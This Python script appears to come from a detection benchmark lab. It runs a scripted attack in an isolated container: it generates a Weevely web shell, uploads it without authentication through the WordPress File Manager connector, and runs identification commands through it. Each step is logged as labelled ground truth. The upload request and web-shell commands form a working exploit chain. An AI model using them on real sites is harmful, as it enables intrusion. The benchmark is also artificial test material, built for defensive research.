"""Run the s01 attack inside the private attacker container."""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")
from background import BackgroundReplay

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
UPLOAD_STEP = "unauthenticated_file_upload"
AGENT_NAME = "maintenance-agent.php"
AGENT_PASSWORD = os.environ["BENCH_AGENT_PASSWORD"]
AGENT_URL = f"{EDGE}/wp-content/plugins/wp-file-manager/lib/files/{AGENT_NAME}"


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def timestamp_offset(value: datetime, milliseconds: int) -> str:
    return (value + timedelta(milliseconds=milliseconds)).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def perform_attack() -> None:
    replay = BackgroundReplay(
        Path("/source/background.log.gz"),
        "wp",
        pace=0.002,
        limit=5000,
        timeout=3,
        seed=101,
        fallback_user_agent="nasa-http-user-agent-unavailable",
    ).start()
    time.sleep(0.2)
    records: dict[str, object] = {
        "scenario_id": "s01",
        "description": (
            "An unauthenticated request abuses the vulnerable WordPress File Manager upload "
            "endpoint, then a Weevely web agent runs a small set of identification commands. "
            "Public web requests are replayed concurrently against the same WordPress app."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": UPLOAD_STEP,
        "steps": [],
        "files": [
            {
                "path": f"/wp-content/plugins/wp-file-manager/lib/files/{AGENT_NAME}",
                "role": "webshell_agent",
            },
            {
                "path": "/wp-content/uploads/wp-file-manager-pro/fm_backup/index.php",
                "role": "plugin_upload_artifact",
            },
        ],
        "split": "dev",
        "expected_rule_ids": [],
    }
    steps: list[dict[str, object]] = []
    with tempfile.TemporaryDirectory(prefix="s01-agent-") as temporary:
        agent = Path(temporary) / AGENT_NAME
        subprocess.run(
            ["weevely", "generate", AGENT_PASSWORD, str(agent)],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        with agent.open("rb") as handle:
            response = requests.post(
                f"{EDGE}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
                data={"cmd": "upload", "target": "l1_Lw"},
                files={"upload[]": (AGENT_NAME, handle, "application/octet-stream")},
                headers={"X-Lab-Step": UPLOAD_STEP},
                timeout=15,
                allow_redirects=False,
            )
        ended_at = timestamp()
        if response.status_code != 200:
            raise RuntimeError(f"upload request returned HTTP {response.status_code}")
        try:
            upload_result = response.json()
        except ValueError as exc:
            raise RuntimeError("upload response was not JSON") from exc
        if "added" not in upload_result:
            raise RuntimeError("upload response did not confirm a new file")
        steps.append(
            {
                "id": UPLOAD_STEP,
                "category": "unrestricted_upload",
                "mitre": ["T1190"],
                "label_method": "header",
            }
        )

        for step_id, command in (
            ("agent_identity", "id"),
            ("agent_working_directory", "pwd"),
            ("agent_user", "whoami"),
        ):
            command_started_at = timestamp()
            result = subprocess.run(
                ["weevely", AGENT_URL, AGENT_PASSWORD, command],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=15,
            )
            command_ended = datetime.now(UTC)
            ended_at = command_ended.isoformat(timespec="microseconds")
            if not result.stdout.strip():
                raise RuntimeError(f"Weevely returned no output for {step_id}")
            steps.append(
                {
                    "id": step_id,
                    "category": "webshell_command",
                    "mitre": ["T1059.004"],
                    "label_method": "attacker_ip_time_window",
                    "attacker_ip": ATTACKER_IP,
                    "started_at": timestamp_offset(command_ended, -50),
                    "ended_at": timestamp_offset(command_ended, -20),
                    "command_started_at": command_started_at,
                    "command_ended_at": ended_at,
                    "request": (
                        "POST /wp-content/plugins/wp-file-manager/lib/files/maintenance-agent.php "
                        "HTTP/1.1"
                    ),
                    "status": 200,
                }
            )

    stats = replay.join(timeout=300)
    replay.ip_mapper.write_tsv(Path("/replay/ip_map.tsv"))
    replay.write_records(Path("/replay/background.json"))
    records["steps"] = steps
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps(stats.to_json(replay.source, replay.seed, replay.pace), sort_keys=True))
    if stats.attempted < 5000:
        raise RuntimeError(f"only {stats.attempted} background requests were attempted")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("isolation", "attack"))
    args = parser.parse_args()
    if args.action == "isolation":
        isolate()
    else:
        perform_attack()


if __name__ == "__main__":
    main()
